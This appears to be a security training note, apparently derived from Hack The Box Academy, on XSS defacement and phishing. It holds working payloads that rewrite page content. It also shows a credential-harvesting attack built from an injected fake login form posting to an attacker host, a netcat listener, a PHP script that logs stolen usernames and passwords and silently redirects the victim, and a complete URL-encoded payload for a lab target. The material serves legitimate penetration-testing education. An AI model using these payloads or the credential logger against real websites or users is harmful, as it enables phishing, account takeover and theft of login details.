# 📿 XSS Attacks

## Defacing

`Defacing` a website means changing its look for anyone who visits the website.

We can utilize injected JavaScript code (through XSS) to make a web page look any way we like.

Here are the HTML elements are usually utilized to change the main look of a web page:

* Background Color `document.body.style.background`
* Background `document.body.background`
* Page Title `document.title`
* Page Text `DOM.innerHTML`

Example payload to change the background

```html
<script>document.body.style.background = "#141d2b"</script>
```

Set an image to background:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Change the title of the website:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Changing some text on the page:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):

```javascript
$("#todo").html('New Text');
```

To erase the content of the website and change the body:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

We can also minify our html code and inject it as a one-liner:&#x20;

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Phishing

A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Here is a HTML form used for phishing:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

To inject it ->

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

<figure><img src="../../../.gitbook/assets/image (1396).png" alt=""><figcaption></figcaption></figure>

In this case, we are exploiting a `Reflected XSS` vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the `Reflected XSS` section, and the page should look as follows when we visit the malicious URL

Payload to remove some HTML on a page:

```javascript
document.getElementById('urlform').remove();
```

So our payload becomes:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

We can comment out any HTML, by adding an HTML opening comment after our XSS payload

```html
<!-- 
```

Now to steal the credentials we must set up our listener ->

```shell-session
sudo nc -lvnp 80
```

And now if our target decides to login with the credentials `test:test`, and check the `netcat` output we get

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

We can start our server like this:

```shell-session
ElFelixi0@htb[/htb]$ mkdir /tmp/tmpserver
ElFelixi0@htb[/htb]$ cd /tmp/tmpserver
ElFelixi0@htb[/htb]$ vi index.php #at this step we wrote our index.php file
ElFelixi0@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

_**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**_

```
http://10.129.222.127/phishing/index.php?url=%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.182%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B%3C%2Fscript%3E
```
